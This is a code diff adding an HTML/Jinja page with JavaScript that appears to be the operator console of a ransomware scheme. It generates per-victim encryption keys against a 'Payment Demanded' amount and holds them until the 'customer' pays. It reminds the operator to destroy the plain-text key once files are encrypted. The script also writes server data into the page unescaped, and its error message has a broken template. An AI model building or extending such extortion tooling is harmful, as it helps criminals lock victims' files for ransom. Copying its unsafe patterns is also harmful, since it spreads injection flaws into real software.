@@ -1,0 +1,66 @@
+
+{% extends 'base.html' %}
+
+{% block head_js %}
+
+var getJSON = function(url, callback) {
+	var xhr = new XMLHttpRequest();
+	xhr.open('GET', url, true);
+	xhr.responseType = 'json';
+	xhr.onload = function() {
+		var status = xhr.status;
+		if (status === 200) {
+			callback(null, xhr.response);
+		} else {
+			callback(status, xhr.response);
+		}
+	};
+	xhr.send();
+};
+
+var send_request = function() {	
+	var demand = document.getElementById("demand").value;
+	if (isNaN(parseFloat(demand))) {
+		document.getElementById("results").innerHTML = `Error: <em>{demand} is not a number</em>.`
+	}
+	getJSON(`lock?demand=${demand}`, function(err, data) {
+		if (err != null) {
+			console.log(err);
+		} else {
+			if ('key' in data) {
+				result = "<table style='margin-left: auto; margin-right: auto;'>"
+				result += `<tr><td>Key</td><td><em>${data.key}</em></td></tr>`;
+				result += `<tr><td>Customer ID</td><td>${data.cid}</td></tr>`;
+				result += "</table>";
+				result += "<p><em>Remember to destroy the plain-text key when your customers' files are encrypted!</em></p>";
+				document.getElementById("results").innerHTML = result;
+			} else {
+				document.getElementById("results").innerHTML = `Error: <em>${data.error}</em>`;
+			}
+		}
+	});
+};
+
+{% endblock %}
+
+{%block content %}
+
+<h3 style="text-align:center"> Generate Key </h3>
+
+
+<div style="text-align:center">
+	<p>Use this form to generate a new encryption key.</p>
+	<p>The key will be stored in our secure storage system until the customer has paid. </p>
+</div>
+
+<div style="text-align: center">
+	<form>
+		<label for="demand">Payment Demanded:&nbsp;&nbsp;</label><input type="text" id="demand" name="demand">
+		<button type="button" id="submit" onclick="send_request()">Submit request...</button>
+	</form>
+</div>
+
+<div style="text-align: center; align-content: center;" id="results">
+</div>
+
+{% endblock %}
